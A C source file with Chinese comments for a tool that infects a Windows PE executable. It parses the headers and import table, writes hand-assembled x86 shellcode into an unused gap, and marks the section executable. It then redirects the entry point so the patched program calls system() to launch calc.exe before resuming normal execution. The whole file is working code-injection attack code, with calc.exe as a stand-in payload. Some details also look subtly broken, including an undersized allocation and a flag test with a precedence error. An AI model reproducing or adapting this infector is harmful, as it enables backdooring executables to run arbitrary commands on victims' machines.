#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <stdint.h>
#include <ctype.h>
//节表 
struct section_header{
	uint8_t name[8];//名字
	uint32_t virtualsize;
	uint32_t RVA;//内存中地址
	uint8_t size_of_raw_data[4];//节大小
	uint32_t file_address;//文件中地址,RVA-file_addr得到本节中delta
	uint8_t notimportant[12];
	uint8_t character[4]; 
};

//IDT项
struct IDT_entry{
	uint32_t INT_pointer;//指向INT表
	uint32_t timestamp;
	uint32_t forwarderchain;
	uint32_t dll_name_pointer;//指向DLL名字
	uint32_t IAT_pointer;//指向IAT表
};

//获取文件字节数 
int file_size(char* filename)
{
    struct stat statbuf;
    stat(filename,&statbuf);
    int size=statbuf.st_size;
    return size;
}


uint32_t uint8to32(uint8_t fouruint8[4]) {
	return *(uint32_t*)fouruint8;	
}

uint16_t uint8to16(uint8_t fouruint8[2]) {
	return *(uint16_t*)fouruint8;	
}

uint32_t findgap(uint8_t*exebuffer,uint32_t old_import_table_addr,uint32_t old_import_table_size,uint32_t gapsize,uint32_t buffersize)
{
	uint8_t orresult=0;//相或为0，则有长串0
	for(uint32_t i=old_import_table_addr+old_import_table_size;i<old_import_table_addr+old_import_table_size+gapsize-20;i++){
			orresult=exebuffer[old_import_table_addr+old_import_table_size]|orresult;
	} 
	if(orresult==0)//可以不用搬家,否则还需要继续找 
		return  old_import_table_addr;
	
	//需要搬家 
	int flag=0;
	orresult=0;
	uint32_t index=old_import_table_addr+old_import_table_size+gapsize-20;
	uint32_t gap_begin_addr=0;
	while(flag==0&&index<buffersize)
	{
		for(int i=0;i<gapsize;i++){
			if(exebuffer[index+i]!=0x00){
				orresult=1;
				index=index+i+1;
				break;
			}
		}
		if(orresult==0)//找到了gap 
		{
			//printf("!find gap!\n");
			flag=1;
			gap_begin_addr=index;
			break;
		}
		orresult=0;
	}
	return gap_begin_addr;
}

uint32_t finddatagap(uint8_t*exebuffer,uint32_t old_import_table_addr,uint32_t old_import_table_size,uint32_t gapsize,uint32_t buffersize)
{
	uint8_t orresult=0;//相或为0，则有长串0

	int flag=0;
	orresult=0;
	uint32_t index=old_import_table_addr;
	uint32_t gap_begin_addr=0;
	while(flag==0&&index<buffersize)
	{
		for(int i=0;i<gapsize;i++){
			if(exebuffer[index+i]!=0x00){
				orresult=1;
				index=index+i+1;
				break;
			}
		}
		if(orresult==0)//找到了gap 
		{
			//printf("!find gap!\n");
			flag=1;
			gap_begin_addr=index;
			break;
		}
		orresult=0;
	}
	return gap_begin_addr;
}

int whichsection(struct section_header* the_section_header,uint32_t RVA,int sections){
	int offset=0;
	for(int i=0;i<sections;i++){
		if(i!=sections-1)
		{
			if(RVA>=the_section_header[i].RVA&&
			     RVA<the_section_header[i+1].RVA)
			{
				offset=i;
				break;
			}
		}
		else if(i==sections-1){
			offset=i;
			break;
		}
	}
	return offset;
}

int main(int argc,char**argv){
	
	
	FILE *fp=NULL;
	int filesize=0;//文件总字节数 
	if(argc!=2){
		printf("use like this:  hack.exe target.exe!\n");
		return 0;
	}
	
	fp=fopen(argv[1],"rb+");
	if(fp==NULL){
		printf("open file %s failed!\n",argv[1]);
		return 0;
	}
	filesize=file_size(argv[1]);//文件总大小
	uint8_t  *exebuffer=(uint8_t*)malloc(filesize);//要写回，大小不要随意改变
	
	int readsize=fread(exebuffer,1,filesize,fp);
	if(readsize==0){
		printf("read %s failed!\n",argv[1]);
		return 0;
	}
	else{
		printf("filesize is %d, readsize is %d\n",filesize,readsize);
	} 
	//检查是不是PE文件 
	uint16_t pehead=uint8to16(exebuffer);
	if(pehead!=0x5a4d){
		printf("PE head is %0X,not a PE file!\n",pehead);
		return 0;
	}
	
	uint32_t NT_header_index=uint8to32(&exebuffer[60]);//0x3C
	//printf("NT header is at %0X\n",NT_header_index);
	uint32_t signature=uint8to32(&exebuffer[NT_header_index]);
	//"PE" 50 45
	if(signature!=0x4550){
		printf("PE head is %0X,not a PE file!\n",signature);
		return 0;
	}
	
	uint16_t sections=uint8to16(&exebuffer[NT_header_index+4+2]);//有多少个节,可能需要读多少个节表 
	//0x4+0x14=20字节，可选头从NT_header_index+24开始
	uint16_t option_header_size=uint8to16(&exebuffer[NT_header_index+4+16]);//可选头大小 
	
	uint32_t option_header_index=NT_header_index+24;//可选头开始 
	uint32_t num_of_directory=uint8to32(&exebuffer[option_header_index+92]);//0x5C,一般是0x10
	//每项8字节，引入表在第2项,目录第1项在偏移option_header_index的0x60=96 
	uint32_t* import_table_addr=(uint32_t*)&exebuffer[option_header_index+96+8];//之后可能要搬家 
	uint32_t* import_table_size=(uint32_t*)&exebuffer[option_header_index+96+12];//直接使用指针，之后要加20 
	 
	//uint32_t* bound_table_addr=(uint32_t*)&exebuffer[option_header_index+96+88];//如果绑定表有的话，清空 
	//uint32_t* bound_table_size=(uint32_t*)&exebuffer[option_header_index+96+92];//清0	
	uint32_t* entrypoint=(uint32_t*)&exebuffer[option_header_index+16];
	uint32_t* imagebase=(uint32_t*)&exebuffer[option_header_index+28];
	
	printf("enrty point is %0X\n",*entrypoint);
	printf("imagebase is %0X\n",*imagebase);
	
	uint32_t *section_delta_offset=(uint32_t*)malloc(sections*sizeof(uint32_t));
	struct section_header *the_section_header=
	     (struct section_header *)malloc(sections*sizeof(struct section_header));
	memset(the_section_header,0,sections*40);
	//memcpy(the_section_header,&exebuffer[option_header_index+option_header_size],sections*40);
	the_section_header=(section_header *)&exebuffer[option_header_index+option_header_size];//pointer now 
	//通过pointer to raw data判断现在在哪个节里面，需要使用哪个节的delta 
	//file_offset+delta=RVA，PE文件中记录的是RVA 
	//同时记录.data节的序号 
	int datasectionnum=-1;
	for(int i=0;i<sections;i++){
		section_delta_offset[i]=the_section_header[i].RVA - 
		                        the_section_header[i].file_address;
		if(!strcmp((char*)the_section_header[i].name,".data")||!strcmp((char*)the_section_header[i].name,"data"))
			datasectionnum=i;
	}
	printf("data section  is in the %d place. \n",datasectionnum);
	//寻找空隙 20字节IDT新项，4字节指针[INT]，20字节函数序号和名，4字节前面指针的INT结尾 
	//16字节的Func.dll名字，IAT表指针，和IAT表0000000 
	uint32_t  gapsize=150;//至少需要那么大的空隙,四字节对齐 
	//往后找空隙，返回开始的文件偏移号；如果往后找不到，可能直下一步接往.data中找 
	//需要先把引入表的RVA转为文件偏移
	uint32_t import_table_fileaddr=0;
	int idt_offset=0;
	for(int i=0;i<sections;i++){
		if(i!=sections-1)
		{
			if(*import_table_addr>=the_section_header[i].RVA && *import_table_addr<the_section_header[i+1].RVA)
			{
				import_table_fileaddr=*import_table_addr-section_delta_offset[i];
				idt_offset=i;
				break;
			}
		}
		else if(i==sections-1){
			import_table_fileaddr=*import_table_addr-section_delta_offset[i];
			idt_offset=i;
			break;
		}
	} 
	
	struct IDT_entry *the_IDT=(IDT_entry *)malloc(sizeof(import_table_size-20));
	memcpy(the_IDT,&exebuffer[import_table_fileaddr],*import_table_size-20);
	int kernel32_idt_index=0;
	//通过IDT项的第4个成员，寻找kernel32.dll
	for(int i=0;i<(*import_table_size-20)/20;i++){	
		//printf("dll name is %s\n",&exebuffer[the_IDT[i].dll_name_pointer-section_delta_offset[idt_offset]]);
		if(!strcmp(strupr((char*)&exebuffer[the_IDT[i].dll_name_pointer-section_delta_offset[idt_offset]]),"KERNEL32.DLL"))
		{
			kernel32_idt_index=i;//记录kernel32.dll在哪个IDT项中 
			printf("found kernal32.dll!\n");
		}
	}
	
	
	
	//判断kernel32.dll的INT在哪个节，计算RVA和文件偏移的转换值 
	int INT_offset=whichsection(the_section_header,the_IDT[kernel32_idt_index].INT_pointer,sections);
	
	//判断kernel32.dll的IAT在哪个节，计算RVA和文件偏移的转换值 
	int IAT_offset=whichsection(the_section_header,the_IDT[kernel32_idt_index].IAT_pointer,sections);

	//INT和IAT在文件中的地址 
	uint32_t kernel32_INT_firstindex=the_IDT[kernel32_idt_index].INT_pointer-section_delta_offset[INT_offset];
	uint32_t kernel32_IAT_firstindex=the_IDT[kernel32_idt_index].IAT_pointer-section_delta_offset[IAT_offset];
	//printf("INT begin at %0X\n",kernel32_INT_firstindex);
	//printf("IAT begin at %0X\n",kernel32_IAT_firstindex);
	
	//寻找oadLibrary和GetPorcAddress在INT中的下标【在第几个】，INT中和IAT中的下标一致 
	int subindex_LoadLibraryA=0;//
	int subindex_GetProcAddress=0;
	
	//在INT中一项项遍历找 
	uint32_t function_hint_name_entry=0;
	uint32_t hint_name_addr=0;
	uint32_t hint_name_section=0;
	for(int i=0;i>=0;i++){
		memcpy(&function_hint_name_entry,(uint32_t*)&exebuffer[kernel32_INT_firstindex]+i,4);
		if(function_hint_name_entry==0)
			break;
		hint_name_section=whichsection(the_section_header,function_hint_name_entry,sections);
		hint_name_addr=function_hint_name_entry-section_delta_offset[hint_name_section];
		if(!strcmp((char*)&exebuffer[hint_name_addr]+2,"LoadLibraryA")){
			subindex_LoadLibraryA=i;
			//printf("LoadLibraryA serial num is %d\n",i);
		}
		else if(!strcmp((char*)&exebuffer[hint_name_addr]+2,"GetProcAddress")){
			subindex_GetProcAddress=i;
			//printf("GetProcAddress serial num is %d\n",i);
		}
	}
	//如果竟然没有找到，报错  
	if(subindex_LoadLibraryA==0||subindex_GetProcAddress==0){
		printf("kernel32.dll no LoadLibraryA() or GetProcAddress()!!Failed!\n");
		return 0;
	}
	//通过上面的下标，在IAT中计算RVA 
	uint32_t LoadLibraryA_RVA=0;
	uint32_t GetProcAddress_RVA=0;
	
	LoadLibraryA_RVA=kernel32_IAT_firstindex+4*subindex_LoadLibraryA+section_delta_offset[IAT_offset];
	GetProcAddress_RVA=kernel32_IAT_firstindex+4*subindex_GetProcAddress+section_delta_offset[IAT_offset];
	
	printf("LoadLibraryA_RVA is %X\n",LoadLibraryA_RVA);
	printf("GetProcAddress_RVA is %X\n",GetProcAddress_RVA);
	
	//计算VA 
	uint32_t LoadLibraryA_VA=LoadLibraryA_RVA+*imagebase;
	uint32_t GetProcAddress_VA=GetProcAddress_RVA+*imagebase;
	
	//寻找空隙 
	uint32_t gap_firstindex=findgap(exebuffer,import_table_fileaddr,*import_table_size,gapsize,filesize);
	//如果找到了这么大的空隙 
	if(gap_firstindex!=0){
		gap_firstindex=gap_firstindex+4-(gap_firstindex%4);
		printf("Find enough gap! It starts at file-offset %0X\n",gap_firstindex);
	}
	else//尝试在数据区找到空隙 
	{
		gap_firstindex=finddatagap(exebuffer,the_section_header[datasectionnum].file_address,*import_table_size,gapsize,filesize);
		if(gap_firstindex!=0){
			gap_firstindex=gap_firstindex+4-(gap_firstindex%4);
			printf("Find enough gap! It starts at file-offset %0X\n",gap_firstindex);
		}
		else{
			printf("Operation failed! No enough gap to change!\n");
			return 0;
		}
	}	
	
	//定位gap所在节,决定offset和节名 
	uint32_t gap_firstRVA=0;
	for(int i=0;i<sections;i++){
		if(i!=sections-1)
		{
			if(gap_firstindex>=the_section_header[i].file_address && gap_firstindex<the_section_header[i+1].file_address)
			{
				gap_firstRVA=gap_firstindex+section_delta_offset[i];
				if(((uint8_t*)&the_section_header[i].virtualsize)[3]&0x20==0){
					((uint8_t*)&the_section_header[i].virtualsize)[3]+=0x20;//execute permission
				}
				break;
			}
		}
		else if(i==sections-1){
			gap_firstRVA=gap_firstindex+section_delta_offset[i];
			if(((uint8_t*)&the_section_header[i].virtualsize)[3]&0x20==0){
					((uint8_t*)&the_section_header[i].virtualsize)[3]+=0x20;//execute permission
				}
			break;
		}
	} 
	//printf("\nFirstRVA of the gap area is %0X,fileaddr is %0X\n",gap_firstRVA,gap_firstindex);
	
	//有了开始的文件偏移和RVA，可以开始了！先把原来的表复制过去 
	uint32_t rel_offset=0;//实时偏移 
	
	
	uint32_t string_index=gap_firstindex+80;//字符串地址，空出100个字节 
	uint32_t string_RVA=gap_firstRVA+80;
	uint32_t string_VA=gap_firstRVA+80+*imagebase;
	uint8_t maching_code[10];
	
	//安排 "msvcrt.dll"参数 
	memcpy(&exebuffer[string_index],(void*)"msvcrt.dll",sizeof("msvcrt.dll"));
	
	//mov DWORD PTR SS:[ESP], "msvcrt.dll"的VA 
	memcpy(&exebuffer[gap_firstindex],(void*)"\xC7\x04\x24",3);
	rel_offset=rel_offset+3;
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)&string_VA,4);
	rel_offset=rel_offset+4;
	printf("msvcrt.dll string is at %X\n",string_VA);
	
	//mov EAX, DWORD PTR DS:LoadLibraryA()地址 
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xA1",1);
	rel_offset=rel_offset+1;
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)&LoadLibraryA_VA,4);
	rel_offset=rel_offset+4;
	
	//call EAX
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xFF\xD0",2);
	rel_offset=rel_offset+2;
	
	//安排"system" 
	string_index=string_index+16;
	string_RVA=string_RVA+16;
	string_VA=string_VA+16;
	memcpy(&exebuffer[string_index],(void*)"system",sizeof("system"));
	
	//mov DWORD PTR SS:[ESP],"system"的VA 
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xC7\x44\x24\x04",4);
	rel_offset=rel_offset+4;
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)&string_VA,4);
	rel_offset=rel_offset+4;
	printf("system string is at %X\n",string_VA);
	
	//mov DWORD PTR SS:[ESP],EAX
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\x89\x04\x24",3);
	rel_offset=rel_offset+3;
	
	//mov EAX, DWORD PTR DS:GetProcAddress()的VA
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xA1",1);
	rel_offset=rel_offset+1;
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)&GetProcAddress_VA,4);
	rel_offset=rel_offset+4;
	printf("getprocaddr is at %X\n",GetProcAddress_VA);
	
	//call EAX 
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xFF\xD0",2);
	rel_offset=rel_offset+2;
	
	//安排字符串 
	string_index=string_index+16;
	string_RVA=string_RVA+16;
	string_VA=string_VA+16;
	memcpy(&exebuffer[string_index],(void*)"C:/windows/system32/calc.exe",sizeof("C:/windows/system32/calc.exe"));
	
	//mov DWORD PTR SS:[ESP],"C:/windows/system32/calc.exe"的VA 
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xC7\x04\x24",3);
	rel_offset=rel_offset+3;
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)&string_VA,4);
	rel_offset=rel_offset+4;
	printf("calc.exe string is at %X\n",string_VA);
	
	//call EAX
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xFF\xD0",2);
	rel_offset=rel_offset+2;
	
	//jmp previous_entrypoint
	uint32_t returnjmp=(uint32_t)0-(gap_firstRVA+rel_offset+5-*entrypoint);
	printf("returnjmp is %X\n",returnjmp);
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xE9",1);
	rel_offset=rel_offset+1;
	
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)&returnjmp,4);
	rel_offset=rel_offset+4;
	
	//change entrypoint
	*entrypoint=gap_firstRVA;
	

	printf("hack succesfully, open %s now!\n",argv[1]); 
	 
	free(section_delta_offset);
	free(the_section_header);
	rewind(fp);//指向文件开头 
	fwrite(exebuffer,1,filesize,fp);
	free(exebuffer);
	free(the_IDT);	
	fclose(fp);
	return 0;
}
